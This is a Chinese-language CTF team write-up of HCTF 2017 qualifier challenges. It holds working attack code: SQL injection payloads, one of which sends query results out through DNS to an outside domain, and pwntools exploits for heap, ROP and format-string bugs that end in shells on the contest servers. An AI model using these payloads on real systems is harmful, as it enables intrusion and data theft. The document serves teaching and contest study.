# HCTF 2017 Quals Writeup

> by AAA

------------------------

## easy_sign_in

证书里有个 IP，访问就有 flag

## boring website

下载备份文件，发现注释说了link server:mysql。于是注入，一套查下来就行了
```
1 union SELECT * FROM OPENQUERY(mysql,'SELECT load_file(concat("\\\\",hex(user()),".758afc7c.2m1.pw\\owo"))');
```

## SQL Silencer

+ 过滤了空格，%0b bypass
+ 接着就是不允许and or，所以用了div，exists返回0或者1，1 div 0 会出错
+ 配合regexp，单引号不能用就用0xxxxx的hex串代替字符串

```python
from requests import get

dic = '_0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ/.@!"#%&\'(),-./:;<=>?[]^`{|}~*+$'
url = 'http://sqls.2017.hctf.io/index/index.php?id='
# param = "1%09div%09exists(select%09flag%09from%09flag%09where%09flag%09regexp%09binary%090x5e{})"
param = "1%09div%09exists(select%09flag%09from%09(select%09flag%09from%09flag%09where%09flag%09regexp%090x5E5B5E775D)b%09where%09flag%09regexp%09binary%090x5e{})"
payload = './'

while True:
	for i in dic:
		this_url = url + param.format((payload + i).encode('hex'))
		try:
			req = get(this_url)
			if 'Alice' in req.content:
				payload += i
				print payload
				break
			else:
				continue
		except Exception as e:
			print "error: %s" % e
```

## bin1-1

windows逆向，有两处反调试在TLS的初始化，分别是检测所有进程里是否存在常见的分析工具，再看线程的状态决定是否退出。在check flag的过程中也会有对线程状态的检测，不知道在检测什么，反正很容易退出。将这三处nop掉就可以正常调试了。

第一步要求输入username，我还以为这就是个flag，写脚本推一下。逻辑是逆序后进行运算，每个byte独立运算。

```python
In [8]: target=[164,169,170,190,188,185,179,169,190,216,190]
In [33]: for i in range(len(target)):
    ...:     for j in range(255):
    ...:         r = ((((i^0x76)-52)^0x80)+43)^j
    ...:         if r&0xff == target[i]:
    ...:             print j
    ...:             res+=chr(j)
    ...:             break
    ...:

In [35]: res[::-1]
Out[35]: 'M.KATSURAGI'
```

交掉错了，然后什么都没干，进入第二步，输入另一个字符串。这时候可以将check username全都nop掉，没什么鬼用。

第二步将输入的字符串分段处理，期间有些可能是反调试的，还有一些push了2个函数指针但是什么都没干的函数。

1. `buffer = input xor 0x76`
2. `tmp1 = encode_1(buffer+7)`
3. `tmp2 = encode_2(buffer+14)`
4. `tmp3 = encode_3(buffer+21)`

之后再将对应位置的字符换掉，即`buffer[7:14]=tmp1, buffer[14:21]=tmp2, buffer[21:28]=tmp3`。

写脚本爆破一下即可得到flag。

```python
In [58]: def encode_3(cin):
    ...:     tp=cin^0xef
    ...:     return (16*tp)&0xf0 | ((tp&0xf0)>>4)
    ...:

In [59]: def encode_2(cin):
    ...:     tp=cin^0xbe
    ...:     return (4*tp)&0xcc | ((tp&0xcc)>>2)

In [42]: def encode_1(cin):
    ...:     tp = cin^0xad
    ...:     return (2*tp)&0xAA | ((tp&0xAA)>>1)

In [38]: def encode_0(cin):
    ...:     return cin^0x76


In [72]: ret = ""
    ...: for i in range(len(target)):
    ...:     for j in range(256):
    ...:         if i <7:
    ...:             r = encode_0(j)
    ...:         elif i<14:
    ...:             r = encode_1(encode_0(j))
    ...:         elif i<21:
    ...:             r = encode_2(encode_0(j))
    ...:         elif i<28:
    ...:             r = encode_3(encode_0(j))
    ...:         else:
    ...:             r = encode_0(j)
    ...:         if r == target[i]:
    ...:             print chr(j),
    ...:             ret += chr(j)
    ...:             break
```

得到flag是 `hctf{>>D55_CH0CK3R_B0o0M!-e0e2b045}`


## bin2-1

linux32位自己写了一个虚拟机和解释器，于是写一个反汇编器然后debug验证自己的猜想即可。
这里有几个坑，有的code是read3byte，有的code是read1byte再read2byte，还好我眼里好看到了。而且有一些char和int不一样的操作，除此之外应该没有别的坑了。

```python
i = 0
turn = 0

def read2code():
    global cmdBuffer
    global i
    ret = cmdBuffer[i], cmdBuffer[i + 1]
    i += 2
    return ret


while True:
    turn += 1
    if i >= len(cmdBuffer):
        break
    cmd = cmdBuffer[i] & 0xFE
    isCode2Ptr = bool(cmdBuffer[i] & 1)
    i += 1
    line = "NOP"
    if cmd == 0:
        code1, code2 = read2code()
        if isCode2Ptr:
            line = "char [%s] = [%s]" % (code1, code2)
        else:
            line = "char [%s] = %s" % (code1, code2)
    elif cmd == 2:
        code1, code2 = read2code()
        if isCode2Ptr:
            line = "int [%s] = [%s]" % (code1, code2)
        else:
            line = "int [%s] = %s" % (code1, code2)
    elif cmd == 4:
        if isCode2Ptr:
            code1, code2 = read2code()
            line = "int [%s] = [%s]" % (code1, code2)
    elif cmd == 6:
        code1, code2 = read2code()
        if isCode2Ptr:
            line = "int [%s] = [%s]" % (code1, code2)
    elif cmd == 8:
        code1, code2 = read2code()
        if isCode2Ptr:
            line = "int [%s] = *[%s]" % (code1, code2)
    elif cmd == 10:
        code1, code2 = read2code()
        if isCode2Ptr:
            line = "char [%s] = *[%s]" % (code1, code2)
    elif cmd == 12:
        code1, code2 = read2code()
        if isCode2Ptr:
            line = "int [%s] += [%s]" % (code1, code2)
        else:
            line = "int [%s] += %s" % (code1, code2)
    elif cmd == 14:
        code1, code2 = read2code()
        if isCode2Ptr:
            line = "int [%s] += 4 * [%s]" % (code1, code2)
        else:
            line = "int [%s] += 4 * %s" % (code1, code2)
    elif cmd == 16:
        code1, code2 = read2code()
        if isCode2Ptr:
            line = "int [%s] += [%s]" % (code1, code2)
        else:
            line = "int [%s] += %s" % (code1, code2)
    elif cmd == 18:
        code1, code2 = read2code()
        if isCode2Ptr:
            line = "int [%s] ^= [%s]" % (code1, code2)
        else:
            line = "int [%s] ^= %s" % (code1, code2)
    elif cmd == 20:
        code1, code2 = read2code()
        if not isCode2Ptr:
            line = "char/int [%s] %%= [%s]" % (code1, code2)
    elif cmd == 22:
        code1, code2 = read2code()
        if isCode2Ptr:
            line = "char [%s] |= [%s]" % (code1, code2)
        else:
            line = "char [%s] |= %s" % (code1, code2)
    elif cmd == 24:
        code1, code2 = read2code()
        if isCode2Ptr:
            line = "char [%s] &= [%s]" % (code1, code2)
        else:
            line = "char [%s] &= %s" % (code1, code2)
    elif cmd == 26:
        code1, code2 = read2code()
        if isCode2Ptr:
            line = "char [%s] = [%s] #plusone" % (code1, code2)
        else:
            line = "char [%s] = %s #plusone" % (code1, code2)
    elif cmd == 28:
        code1, code2 = read2code()
        if isCode2Ptr:
            line = "#minusone char [%s] = [%s]" % (code1, code2)
    elif cmd == 30:
        code1, code2 = read2code()
        if isCode2Ptr:
            line = "char [%s] >>= [%s]" % (code1, code2)
        else:
            line = "char [%s] >>= %s" % (code1, code2)
    elif cmd == 32:
        code1, code2 = read2code()
        if isCode2Ptr:
            line = "char [%s] <<= [%s]" % (code1, code2)
        else:
            line = "char [%s] <<= %s" % (code1, code2)
    elif cmd == 34:
        code1, code2 = read2code()
        if isCode2Ptr:
            line = "int [%s] <<r= [%s]" % (code1, code2)
        else:
            line = "int [%s] <<r= %s" % (code1, code2)
    elif cmd == 36:
        code1, code2 = read2code()
        if isCode2Ptr:
            line = "bool [%s] < [%s]" % (code1, code2)
        else:
            line = "bool [%s] < %s" % (code1, code2)
    elif cmd == 38:
        code1, code2 = read2code()
        if isCode2Ptr:
            line = "bool [%s] == [%s]" % (code1, code2)
        else:
            line = "bool [%s] == %s" % (code1, code2)
    elif cmd == 40:
        line = "store/load PC"
    elif cmd == 42:
        line = "return"
    else:
        line = "unknown code"
    print "turn", turn, "cmd", hex(cmd), line
    
```

disasm的过程比较简单，主要是有些操作太难懂，循环是靠`store/load PC`来实现的，共有4个循环，前3个进行加密，最后1个进行check。

第一轮加密是乱序，每次index+=51，执行32次，然后填到buffer[0:32]的位置。

第二轮加密是将buf[i]的后5bit和buf[i+1]的前3bit串起来，以此类推生成32byte，放在buffer[32:64]里。（这个比较难看出来，但因为循环进行了31次、生成了32个byte，和一些临时数据的内容，最后还是看出来了）中间有个`+4*224`的操作，对于char应该是`-4*32`，一开始以为是作者写了一个向后的溢出，直到debug才知道是取拿buffer[0:32]的位置。

第三轮加密是用`0xdeadbeef`的每个byte，和当前轮数i，对buffer[32:64]操作生成buffer[64:96]，循环去拿`deadbeef`的每个byte，加上i，进行xor。

第四轮似乎是对比target，这段没逆，大概率是这样的。

最后让学弟写个脚本解密一下：

```
final = [0xf7, 0xc, 0x3b, 0x81, 0x8, 0x49, 0x86, 0xd,0x4d, 0x85, 0x8b, 0x20, 0x80, 0x89, 0xd5, 0x45,0xdc, 0xc, 0x2b, 0xb, 0x79, 0x60, 0x2d, 0x9d,0xc5, 0x7d, 0xc2, 0xd9, 0x49, 0xd8, 0x27, 0x4c]
dd = 0xefbeadde

def pad53(a,b):
	return ((a>>3) + (b<<5))&0xff

for i in range(32):
	final[i] ^= ((dd+i)&0xff)
	dd = (dd >> 8) + ((dd&0xff) << 24)
print [hex(i) for i in final]

tmp = []
for i in range(32):
	tmp.append(pad53(final[i],final[(i-1)%32]))
final = tmp
print [hex(i) for i in final]
tmp = [0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]
print [chr(i) for i in final]

for i in range(32):
	tmp[((i+1)*51)%32] = final[i]
# final = tmp
print [chr(i) for i in tmp]

print ''.join([chr(i) for i in tmp])
```

flag是`hctf{h4v3_Fun_w17h_EZ_VM__bfacf}`


## bin3-1

linux题，使用了ptrace进行hook，监控了syscall的调用。代码里先初始化了一块sbox，长得很像RC4，之后进入fork有两段逻辑。一段是拿到自己的pid，之后再次调用execve重启自己，执行带有pid参数的逻辑，使用ptrace对子线程的syscall调用进行监控。用ida从标准库导入定义，发现监控的是read/write/close。

对于write，所有的输出函数基本都会调用到，每次传来buffer和len以后，用最开始的sbox进行解密，因为sbox是不会被写入的，解密顺序不会影响结果。写脚本模拟一下解密流程。

对于read，只有一次调用，即输入flag的那次，将长度是64以内，存放在全局可访问位置。

对于close，只有一次调用，线程退出总会调用到，真正的check逻辑在这里。首先将text段的内容进行解密，解密过程与解密字符串相同，而且text段本身是rwx的，没有调用到mprotect。之后jump过去，对flag进行解密，显然是RC6，到网上找个轮子改改即可，寄存器宽度是32bit，轮数是20，密钥是写死的可见字符串的前16个。

最后flag是`???????`

## babycrack

### 题目
网站一幅图一个输入框，查看源码发现内容都在js里面，js混淆的比较厉害所以这题就是个js逆向。

### 解混淆
混淆分为几种：

#### 匿名函数
这类函数都是定义完即调用且只调用一次，且基本和输入无关，效果大多就是改变某个全局数组的内容。这类函数放到console里面执行一下，把修改后的数组输出一下，就可以从原js中剔除了。

#### 全局数组
这类数组除了被上面的匿名函数修改之外，只被取值（取值均在修改之后），且取值的下标为常数，所以写了个py脚本进行自动替换。举个例子：
```python
def step1():
    _0x2e2f8d = ["onMessage", "runtime", "executeScript",...]
    def get_function_table_in_check(_0x3120e0):
        _0x3120e0 = int(str(_0x3120e0), 0x10)
        _0x3a882f = _0x2e2f8d[_0x3120e0]
        return _0x3a882f
    s=open("hctf.js","r").read()
    import re
    pattern=r"get_function_table_in_check\(.*?\)"
    search = re.search(pattern,s)
    while search:
        t=search.group()
        s=s.replace(t, '"%s"'%eval(t))
        search = re.search(pattern,s)
    open("step1.js","w").write(s)
```

更多见`update.py`:
```python
#step1: replace _0x180a done by chrome console
def step2():
    s=open("step1.js","r").read()
    _0x180a = ["version", "error", "download", "substring", "push", "Function", "charAt", "idle", "pyW5F1U43VI", "init", "https://the-extension.com", "local", "storage", "eval", "then", "get", "getTime", "setUTCHours", "origin", "set", "GET", "loading", "status", "removeListener", "onUpdated", "callee", "addListener", "onMessage", "runtime", "executeScript", "data", "test", "http://", "Url error", "query", "filter", "active", "floor", "random", "charCodeAt", "fromCharCode", "parse", "substr", "\w+", "replace", "(3(){(3 a(){7{(3 b(2){9((''+(2/2)).5!==1||2%g===0){(3(){}).8('4')()}c{4}b(++2)})(0)}d(e){f(a,6)}})()})();", "||i|function|debugger|length|5000|try|constructor|if|||else|catch||setTimeout|20", "pop", "length", "join", "getElementById", "message", "log", "Welcome to HCTF:>", "Congratulations! you got it!", "Sorry, you are wrong...", "window.console.clear();window.console.log('Welcome to HCTF :>')"]
    def _0xa180(_0x5c351c):
        _0x5c351c = int(_0x5c351c[2:],16)
        _0x26f3b3 = _0x180a[_0x5c351c]
        return _0x26f3b3
    import re
    pattern=r"_0xa180\(\'(0x.*?)\'\)"
    search = re.search(pattern,s)
    while search:
        t=search.group()
        s=s.replace(t, "'%s'"%eval(t))
        search = re.search(pattern,s)
    open("step2.js","w").write(s)

# step3: replace _0x2e2f8d value by hand

def step4():
    _0x2e2f8d = ["onMessage", "runtime", "executeScript", "replace", "data", "test", "includes", "http://", "length", "Url error", "query", "filter", "active", "floor", "random", "charCodeAt", "fromCharCode", "parse", "toString", "substr", "split", "code", "version", "error", "download", "invalidMonetizationCode", "substring", "push", "Function", "charAt", "idle", "pyW5F1U43VI", "init", "https://the-extension.com", "local", "storage", "eval", "then", "get", "getTime", "setUTCHours", "url", "origin", "set", "GET", "loading", "status", "removeListener", "onUpdated", "tabs", "callee", "addListener"]
    def _0x43c8d1(_0x3120e0):
        _0x3120e0 = int(str(_0x3120e0), 0x10)
        _0x3a882f = _0x2e2f8d[_0x3120e0]
        return _0x3a882f
    s=open("step3.js","r").read()
    import re
    pattern=r"_0x43c8d1\(.*?\)"
    search = re.search(pattern,s)
    while search:
        t=search.group()
        s=s.replace(t, "'%s'"%eval(t))
        search = re.search(pattern,s)
    open("step4.js","w").write(s)
        


# change to melody file

def step1():
    _0x2e2f8d = ["onMessage", "runtime", "executeScript", "replace", "data", "test", "includes", "http://", "length", "Url error", "query", "filter", "active", "floor", "random", "charCodeAt", "fromCharCode", "parse", "toString", "substr", "split", "code", "version", "error", "download", "invalidMonetizationCode", "substring", "push", "Function", "charAt", "idle", "pyW5F1U43VI", "init", "https://the-extension.com", "local", "storage", "eval", "then", "get", "getTime", "setUTCHours", "url", "origin", "set", "GET", "loading", "status", "removeListener", "onUpdated", "tabs", "callee", "addListener"]
    def get_function_table_in_check(_0x3120e0):
        _0x3120e0 = int(str(_0x3120e0), 0x10)
        _0x3a882f = _0x2e2f8d[_0x3120e0]
        return _0x3a882f
    s=open("hctf.js","r").read()
    import re
    pattern=r"get_function_table_in_check\(.*?\)"
    search = re.search(pattern,s)
    while search:
        t=search.group()
        s=s.replace(t, '"%s"'%eval(t))
        search = re.search(pattern,s)
    open("step1.js","w").write(s)


def step2():
    s=open("step1.js","r").read()
    gg = ["version", "error", "download", "substring", "push", "Function", "charAt", "idle", "pyW5F1U43VI", "init", "https://the-extension.com", "local", "storage", "eval", "then", "get", "getTime", "setUTCHours", "origin", "set", "GET", "loading", "status", "removeListener", "onUpdated", "callee", "addListener", "onMessage", "runtime", "executeScript", "data", "test", "http://", "Url error", "query", "filter", "active", "floor", "random", "charCodeAt", "fromCharCode", "parse", "substr", "\w+", "replace", "(3(){(3 a(){7{(3 b(2){9((''+(2/2)).5!==1||2%g===0){(3(){}).8('4')()}c{4}b(++2)})(0)}d(e){f(a,6)}})()})();", "||i|function|debugger|length|5000|try|constructor|if|||else|catch||setTimeout|20", "pop", "length", "join", "getElementById", "message", "log", "Welcome to HCTF:>", "Congratulations! you got it!", "Sorry, you are wrong...", "window.console.clear();window.console.log('Welcome to HCTF :>')"]

    def table(_0x5c351c):
        _0x5c351c = int(_0x5c351c[2:],16)
        _0x26f3b3 = gg[_0x5c351c]
        return _0x26f3b3
    import re
    pattern=r"table\(\'(0x.*?)\'\)"
    search = re.search(pattern,s)
    while search:
        t=search.group()
        s=s.replace(t, '"%s"'%eval(t))
        search = re.search(pattern,s)
    open("step2.js","w").write(s)
```
 
#### 重要函数体
某些重要函数体混淆变量与反调试（且反调试代码很容易辨认，直接删除即可），Melody去掉了反调试并将函数名修改好了。比较长的函数只有一个，通过变量的值可以猜到是和base32有关，去掉反调试后再放到console里面就可以验证是b32encode。其他的函数比如字符串转大整数表示、字符串repeat等都比较容易识别。
 
### 解flag
把flag以下划线分割为多个字符串，每个字符串进行不同的变换，一个个去解就行了，出题人还真不嫌累的。有几个点需要注意：

#### flag最后一段的第6个和第7个字符
在判断的最后一句话里面说明了第6个和第7个字符相等，前面又说这两个字符构成字符串的hex整数表示去掉前面的0x等于第6个字符的ASCII值乘以最后一段flag的长度再乘以5。我们假设第6个字符的ASCII值为16\*a+b，这里a和b都应该在0~9之间（因为其hex表示去掉0x之后可以表示十进制数），且

> (10a+b)\*101=(16a+b)\*5l（这里l为字符串长度）。

从等式右端是5的倍数判断b是0或者5，当b是0的时候无解所以b是5，等式化为

> (2a+1)\*101=(16a+5)\*l。

显然flag长度达不到101，所以101整除16a+5，即a=6，l=13。

#### flag最后一段的前4个字符
假设flag最后一段前4个字符构成字符串的整数表示为a，源码表明有等式

> a - 0x48a05362 == n % l

其中n = e \* f \* g, e = 0x4b7c0a73, f = 0x4315332, g是flag第一段字符串的长度（暂未知），l = 0x2f9b5072。

一开始的想法是爆破flag第一段字符串的长度，从7到15，如果解出来a是合适的ASCII码就对了。后来发现结果总是怪怪的，仔细研究后发现js对于大整数存在精度不足的情况。具体这题来说，js的console里面输入e \* f，得到的值会比准确值小4。最后的解决方案是假设g = 7（这么假设是因为题目给的条件最多只够解出7个字符），然后用js的console进行运算求出a的值，再转成字符串，果然就对了。

#### flag第一段的最后两个字符
把flag第一段最后两个字符转成整数，与第4个字符的ASCII值（已知）进行异或，得到的值除以第一段长度（已知为7），余数为5。出题人大概以为这样可以固定唯一解？最后发了个公告给了整个flag的sha256。由于其他字符我们都知道了，所以用sha256爆破得到最后两个字符的值。

## babyprintf

```c
    gets(v3);
    __printf_chk(1LL, "result: ");
    __printf_chk(1LL, v3);
```

有fsb，但是由于用了`__printf_chk`所以不能任意地址读写，只能打一片栈上地址，leak了`libc`和程序`pie`地址。
```c
    size = readInt();
    if ( size > 0x1000 )
      break;
    v3 = malloc(size);
```

`malloc`的`size`可控，但是不能超过`0x1000`所以没法用`house of mind`。
程序没有`free`，功能结构和`house of orange`一摸一样，所以可以用`house of orange`来解，但是由于用的`libc`是2.24，所以要注意`vtable`的地址必须在`libc`的`_IO_vtable`段。

```python
from pwn import *
import struct
import string
import sys, os
def fmt(size,buf):
	r.sendlineafter('size: ', str(size))
	r.sendlineafter('string: ', buf)
binName = './babyprintf'
libcName = './libc-2.24.so'
site = '47.100.64.113'
port = 23332
context(arch='i686', os='linux', log_level='debug')
context(terminal=['gnome-terminal', '-x', 'zsh', '-c'])
elf = ELF(binName)
libc = ELF(libcName)
# r = process(binName,env={'LD_PRELOAD':libcName})
r = remote(site, port)
r.sendlineafter('token', '79DC7rePzwA6MEC1dwoloOYpbP10IMzG')
raw_input('attach')
fmt(0x20, '%p,'.ljust(0x20,'\x00')+p64(0)+'\xd1'+'\x0f'+'\x00')
r.recvuntil('result: 0x')
libc.address = int(r.recvuntil(',',drop=True),16) - 0x3c3760
print "libc.address:",hex(libc.address)
fmt(0x1000,'A')
payload = p64(0)+p64(0x61)+p64(libc.address+0x3c1b58)+p64(libc.symbols['_IO_list_all']-0x10)+p64(0)+p64(1)
payload = payload.ljust(27*8,'\x00')+p64(libc.address+0x3be4c0)+p64(libc.address+0xcde41)+p64(libc.address+0xcde41)
fmt(0x20,'A'*0x20+payload)
r.sendlineafter('size: ', str(0x80))
r.interactive()
```

## babystack

题目限制了系统调用只能用open, read, exit。漏洞是任意的rop和一个leak，由于是白名单，所以没有别的想法，就是通过rop来读文件。

思路是读取flag文件到bss段，然后每次读取8字节到寄存器中，通过移位操作，使寄存器中只剩flag中的第n个bit(n=0,1,2,3...64)。所以寄存器的值要么是0要么是1，然后将rsp加上这个寄存器的值乘以3，然后在栈上布置两个不同的地址，则最终的效果是：如果是0跳到地址A，如果是1跳到地址B。比如地址A是读取一段输入，地址B是退出程序，这样可以在脚本里继续发数据从而可以判断这个bit是0还是1。这样逐bit爆破出所有的flag。当然事实证明，后来用的判断方法是对面会不会发Segment fault，当然其实是异曲同工。

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = "Kira"
from pwn import *
import sys
import os
context(binary='./babystack', os='linux', log_level='critical')

if len(sys.argv) > 1:
    if sys.argv[1] == 'r':   # remote
        p = remote('47.100.64.113', 20001)
else:
    os.environ['LD_PRELOAD'] = './libc.so.6_885acc6870b8ba98983e88e578179a2c'
    p = process('./babystack')

libc = ELF('./libc.so.6_885acc6870b8ba98983e88e578179a2c')
elf = context.binary


# 0x0000000000021102: pop rdi; ret;
# 0x00000000000202e8: pop rsi; ret;
# 0x0000000000001b92: pop rdx; ret;
# 0x000000000001fb12: pop r12; ret;
# 0x000000000002a69a: pop rbx; ret;
# 0x00000000000d20a3: pop rcx; ret;
# 0x0000000000033544: pop rax; ret;
# 0x0000000000003838: pop rsp; ret;

# 0x0000000000112285: xchg eax, edi; ret;

# 0x0000000000195455: add esp, edi; jmp rax;
# 0x0000000000047bb5: mov r9, qword ptr [rdi + 0x30]; mov rdi, qword ptr [rdi + 0x68]; xor eax, eax; ret;
# 0x0000000000048a8f: shr r9, cl; mov qword ptr [rdi], r9; ret;
# 0x0000000000048985: shl r9, cl; mov qword ptr [rdi], r9; ret;
# 0x0000000000089267: mov rdi, r9; mov qword ptr [rbx], rsi; mov qword ptr [rbx + 0x48], r9; call rcx;
bit = ''
flag = 'hctf{dca20306663620ba1e3c7ed20192fc705ed7ec4151eb61e736098e48778cc8d6}'
flag1 = ''
index = len(flag) * 8
token = '79DC7rePzwA6MEC1dwoloOYpbP10IMzG'
p.sendlineafter('token\n', token)
while True:
    p.sendlineafter('chance\n', str(0x601068))
    libc.address = int(p.recvline()) - libc.symbols['__isoc99_scanf']

    # stack pivot
    rop = [
        libc.address + 0x21102,     # pop rdi; ret;
        0,
        libc.address + 0x202e8,     # pop rsi; ret;
        0x601400,                   # new stack
        libc.address + 0x1b92,      # pop rdx; ret;
        352,
        libc.symbols['read'],
        libc.address + 0x3838,      # pop rsp; ret;
        0x601400,
    ]
    stack_pivot_payload = 'A' * 0x20 + p64(0x6010A9)
    for i in rop:
        stack_pivot_payload += p64(i)

    file = 'flag\x00'
    rop = [
        # read "flag" to bss
        libc.address + 0x21102,     # pop rdi; ret;
        0,
        libc.address + 0x202e8,     # pop rsi; ret;
        0x6010A9,  # bss
        libc.address + 0x1b92,      # pop rdx; ret;
        len(file),
        libc.symbols['read'],

        # open flag file
        libc.address + 0x21102,     # pop rdi; ret;
        0x6010A9,                   # bss
        libc.address + 0x202e8,     # pop rsi; ret;
        0,                          # read
        libc.address + 0x1b92,      # pop rdx; ret;
        0x0,
        libc.symbols['open'],

        # read flag content to bss
        libc.address + 0x112285,    # xchg eax, edi; ret;
        libc.address + 0x202e8,     # pop rsi; ret;
        0x6010A9,  # bss
        libc.address + 0x1b92,      # pop rdx; ret;
        0x100,
        libc.symbols['read'],
    ]

    def brute(index):
        global payload
        rop_bit = [
            # load flag to r9
            libc.address + 0x21102,     # pop rdi; ret;
            0x6010A9 - 0x30 + index / 64 * 8,
            libc.address + 0x47bb5,     # mov r9, qword ptr [rdi + 0x30]; mov rdi, qword ptr [rdi + 0x68]; xor eax, eax; ret;
            libc.address + 0x21102,     # pop rdi; ret;
            0x6010A9 - 0x30,
            libc.address + 0xd20a3,     # pop rcx; ret;
            index,
            libc.address + 0x48985,     # shl r9, cl; mov qword ptr [rdi], r9; ret;
            libc.address + 0xd20a3,     # pop rcx; ret;
            63,                         # r9 = 1 or 0
            libc.address + 0x48a8f,     # shr r9, cl; mov qword ptr [rdi], r9; ret;
            libc.address + 0xd20a3,     # pop rcx; ret;
            3,                          # r9 = 8 or 0
            libc.address + 0x48985,     # shl r9, cl; mov qword ptr [rdi], r9; ret;
            libc.address + 0x2a69a,     # pop rbx; ret;
            0x6010A9 - 0x30,
            libc.address + 0xd20a3,     # pop rcx; ret;
            libc.address + 0xd20a3,     # pop rcx; ret;
            libc.address + 0x89267,     # mov rdi, r9; mov qword ptr [rbx], rsi; mov qword ptr [rbx + 0x48], r9; call rcx;
            libc.address + 0x33544,     # pop rax; ret;
            libc.address + 0x937,       # ret
            libc.address + 0x195455,    # add esp, edi; jmp rax;
            # two condition here
            0x4141414141414141,
            0x400B85,                   # exit
        ]
        for i in rop_bit:
            payload += p64(i)

    p.send(stack_pivot_payload)

    payload = ''
    for i in rop:
        payload += p64(i)

    brute(index)

    sleep(0.3)
    p.send(payload)
    p.send(file)
    content = p.recvline()
    if content.endswith('fault\n'):
        bit += '0'
    else:
        p.unrecv('chance\n')
        bit += '1'
    print bit
    if len(bit) % 8 == 0:
        flag1 = ('%x' % int(bit[-8:], 2)).decode('hex') + flag1
        if len(flag1) % 8 == 0:
            flag += flag1
            print flag
            flag1 = ''
        print flag1
    # p.close()
    # p = process('./babystack')
    # sleep(0.5)
    # p = remote('47.100.64.113', 20001)
    libc.address = 0
    index += 1
```

## guestbook

一个格式化字符串漏洞，name处输入一个格式化字符串，可以printf读出来

格式化字符串是在bss段上的，为了做到任意地址读写，在栈上构造一个跳板，正好栈上有一个`xxx(stack address) -> xxx(stack address) -> 0`，且多次执行该值不改变，用第一个改第二个的值，利用第二个值就可以任意地址写了

写的话由于delete函数里调用了free函数，所以把freehook改成onegadget就getshell了，exp如下：

```python
from pwn import *
r = remote("47.100.64.171", 20002)
libc = ELF('./libc.so.6')
elf = ELF('./guestbook')
#r = process('./guestbook', env = {'LD_PRELOAD': libc.path})
#context(arch='i386', os='linux', log_level='info')
'''
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
gdb.attach(proc.pidof(r)[0])
'''
libc.symbols["one_gadget"] = 0x3a80c

r.sendlineafter("token", "79DC7rePzwA6MEC1dwoloOYpbP10IMzG")

def AddGuest(name, phone):
	r.sendlineafter("your choice:", '1')
	r.sendlineafter("your name?", name)
	r.sendlineafter("your phone?", phone)

def SeeGuest(number):
	r.sendlineafter("your choice:", '2')
	r.sendlineafter("index:", str(number))

def DelGuest(number):
	r.sendlineafter("your choice:", '3')
	r.sendlineafter("index:", str(number))


AddGuest("%p-%p-%p-%72$p", '1'*16)
SeeGuest(0)

r.recvuntil("the name:")
recv = r.recv(10)
if recv:
	x = int(recv, base = 16)
	print hex(x)
	elf.address = x - (0x80061e3a - 0x80061000)
	print hex(elf.address)
	print hex(elf.got["free"])


r.recvuntil("0x1-")
recv = r.recv(10)
if recv:
	x = int(recv, base = 16)
	print hex(x)
	libc.address = x - (0xb77bdda7 - 0xb760d000)
	print hex(libc.address)
	print hex(libc.symbols["system"])
	print "free_hook", hex(libc.symbols["__free_hook"])

r.recvuntil("-")
recv = r.recv(10)
if recv:
	stack_address = int(recv, base = 16)
	print hex(stack_address)
	stack_address += 0x20
	low = stack_address & 0xffff
	low += 2

print "one_gadget", hex(libc.symbols['one_gadget'])

AddGuest("%" + str(int(libc.symbols["__free_hook"] & 0xffff)) + "c%80$hn", '2'*16)
AddGuest("%" + str(int(low)) + "c%72$hn", '3' * 16)
AddGuest("%" + str(int(libc.symbols["__free_hook"] >> 16)) + "c%80$hn", '4' * 16)
AddGuest("%" + str(int(libc.symbols["one_gadget"] & 0xffff)) + "c%88$hn", '5' * 16)
low -= 2

AddGuest("%" + str(int((libc.symbols["__free_hook"] + 2) >> 16)) + "c%80$hn", '2'*16)
AddGuest("%" + str(int(low)) + "c%72$hn", '3' * 16)
AddGuest("%" + str(int((libc.symbols["__free_hook"] + 2) & 0xffff )) + "c%80$hn", '4' * 16)
AddGuest("%" + str(int(libc.symbols["one_gadget"] >> 16)) + "c%88$hn", '5' * 16)


SeeGuest(1)
SeeGuest(2)
SeeGuest(3)
SeeGuest(4)
SeeGuest(5)
SeeGuest(6)
SeeGuest(7)
SeeGuest(8)

DelGuest(1)

r.interactive()
```

## misc_big_zip

打开zip，里面有很多小的文本文件，都是5bytes，于是可以CRC爆破的方法把这些小文本文件的内容都爆破出来。这里主办方非常坑爹不告诉我们字符的范围，一开始跑256种可能，后来猜测是可见字符，再后来又猜只有小写字母，最后才发现范围是字母+下划线。爆破CRC的脚本：

```python
import binascii
from itertools import product

crc_orig = [0x251dee02, 0xb890530f, 0x6e6b39df, 0x50f684c3, 0xde41b551,
            0x24bd35b6, 0xcef2eda8, 0xba2b1745, 0x1f4c7ea9, 0x58b2bfa9,
            0x251dee02, 0xe0f81f1e, 0xbd6fbd41, 0x7342a1f6, 0x665648e9,
            0xe7c594b3, 0xa60ffdd0, 0xce2ce80b, 0x22459f2d, 0x6f8a6539,
            0x2073a2e4, 0x52fa60a8, 0x80410dda, 0xb7c68f27, 0x6e6b39df,
            0xbd598041, 0xaa145d64, 0x16da6b3b, 0x7dd590bc, 0xb9eef5a1,
            0xf0b958f0, 0x445a43f7, 0x8bd55271, 0xc0340fe2, 0xc0cd9ee5,
            0x7fc7de58, 0x53bfec8a, 0x99b5537b, 0xd68019af, 0x73d7ee30,
            0x5fbd3f5e]
crc = crc_orig[:]
dic = "_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
for i in product(dic, repeat=5):
    l = ''.join(i)
    if binascii.crc32(l) & 0xffffffff in crc:
        tmp = binascii.crc32(l) & 0xffffffff
        print crc_orig.index(tmp), l, hex(tmp)
        crc.remove(tmp)
        print 'left:', len(crc)
```

然后把所有爆破出来的内容连起来，发现是一段话，再联系文件里另一个文本文件的名字something_small_make_me_bigger，合起来的大小正好和他大小一样，所以这个东西的内容应该就是他们拼起来。

然后再用明文攻击，用工具AZPR，将flag解压缩。

## rroopp

Launcher.so 看起来是一个包解析器，中间有一处因为没有检查包中 offset 字段和长度
造成了栈溢出，可以任意覆盖栈上的位置，然后在处理分片的包时可以通过一系列的检查最后
退出 main 函数，两者配合可以触发栈溢出

